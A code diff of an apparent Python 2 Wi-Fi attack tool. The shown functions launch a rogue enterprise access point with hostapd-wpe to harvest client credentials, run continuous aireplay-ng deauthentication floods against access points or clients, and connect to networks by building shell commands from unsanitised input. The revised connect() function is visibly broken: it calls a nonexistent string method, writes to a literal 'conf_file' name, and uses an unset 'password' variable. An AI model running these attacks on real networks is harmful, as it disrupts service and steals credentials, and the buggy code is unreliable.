@@ -4,8 +4,9 @@ import os
 import sys
 import time
 from wifi import Cell, Scheme
-
-#interfaz = 'wlxc04a00118487'
+'''
+interfaz = 'wlxc04a00118487'
+'''
 interfaz = raw_input('Network interface: ')
 os.system("sudo ifconfig "+interfaz+" down")
 os.system("sudo iwconfig "+interfaz+" mode managed")
@@ -73,7 +74,7 @@ def create_ap():
 		time.sleep(1)
 		print "Deploying AP..."
 		os.system("sudo airmon-ng check kill")
-		os.system("cd hostapd-wpe && sudo hostapd-wpe ../temp/enterprise.conf")
+		os.system("cd hostapd-wpe && sudo ./hostapd-wpe ../temp/enterprise.conf")
 
 
 def deauth_client():
@@ -101,8 +102,8 @@ def deauth_ap():
 	os.system("sudo ifconfig "+interfaz+" up")
 	os.system("sudo iwconfig "+interfaz+" channel "+channel)
 	cmmd= ("sudo aireplay-ng -0 0 -a "+ap_mac+" -e \""+essid+"\" "+interfaz)
-	print cmmd
 	os.system(cmmd)
+
 
 def deauth():
 	deauth_type=raw_input("1: AP deauth \n2: Client deauth\n")
@@ -127,22 +128,34 @@ def capture_traffic():
 
 def connect():
 	id_red = raw_input('Select id: ')
-	essid=redes[int(id_red)].get("ssid")
-	conf_file="temp/supp.conf"
-	is_psk = raw_input("Is WPA-PSK? (y/N)")
-	if is_psk == "y":
-		password = raw_input('Password: ')
+	red = redes[int(id_red)]
+	essid = red.get("ssid")
+	conf_file = "temp/last_connection.conf"
+	cifrado = red.get("cifrado").lowercase
+	print "Connecting a network with %s encryption" % (cifrado)
+	if cifrado == "none":
+		os.system("echo 'network={\nssid=\""+essid+"\"\nkey_mgmt=NONE\npriority=100\n}' > conf_file")
+	elif cifrado == "wep":
+		passphrase = raw_input("Passphrase:")
+		while ( len(passphrase)!=5 and len(passphrase)!=13 and len(passphrase)!=16 and len(passphrase)!=29):
+			print "Incorrect length (5,13,16 or 29 characters)"
+			passphrase = raw_input("Passphrase:")
+		os.system("echo 'network={\nssid=\""+essid+"\"\nkey_mgmt=NONE\nwep_key0=\""+password+"\"\nwep_tx_keyidx=0}' > conf_file")
+	elif cifrado.startswith("wpa"):
+		passphrase = raw_input("Passphrase:")
+		while len(passphrase)<8:
+			print "Incorrect length (8 or more characters)"
+			passphrase = raw_input("Passphrase:")
 		os.system( "wpa_passphrase "+essid+" "+password+" > " + conf_file)
-		os.system("wpa_supplicant -Dnl80211 -i "+interfaz+" -c "+conf_file+" &")
-		sys.exit()
-	is_enterprise = raw_input("Is WPA-Enterprise? (y/N)")
-	if is_enterprise == "y":
-		identity = raw_input('Identity: ')
-		password = raw_input('Password: ')
-		is_mschapv2 = raw_input("Use PEAP+MSCHAPv2? (y/N)")
-		if is_mschapv2 == "y":
-			os.system("echo 'ctrl_interface=DIR=/var/run/wpa_supplicant \nnetwork={ \nssid=\""+essid+"\"\nscan_ssid=1 \nkey_mgmt=WPA-EAP \neap=PEAP \nidentity=\""+identity+"\"\npassword=\""+password+"\" \nphase1=\"peaplabel=0\" \nphase2=\"auth=MSCHAPV2\" \n}' > "+conf_file)
-			os.system("wpa_supplicant -Dnl80211 -i "+interfaz+" -c "+conf_file+" &")
+	else:
+		print "Unknown encryption type"
+	# Connection
+	os.system("wpa_supplicant -Dnl80211 -i "+interfaz+" -c "+conf_file+" &")
+	sys.exit()
+	'''
+	#PEAP+MSCHAPv2
+	os.system("echo 'ctrl_interface=DIR=/var/run/wpa_supplicant \nnetwork={ \nssid=\""+essid+"\"\nscan_ssid=1 \nkey_mgmt=WPA-EAP \neap=PEAP \nidentity=\""+identity+"\"\npassword=\""+password+"\" \nphase1=\"peaplabel=0\" \nphase2=\"auth=MSCHAPV2\" \n}' > "+conf_file)		
+	'''
 
 
 def scan():
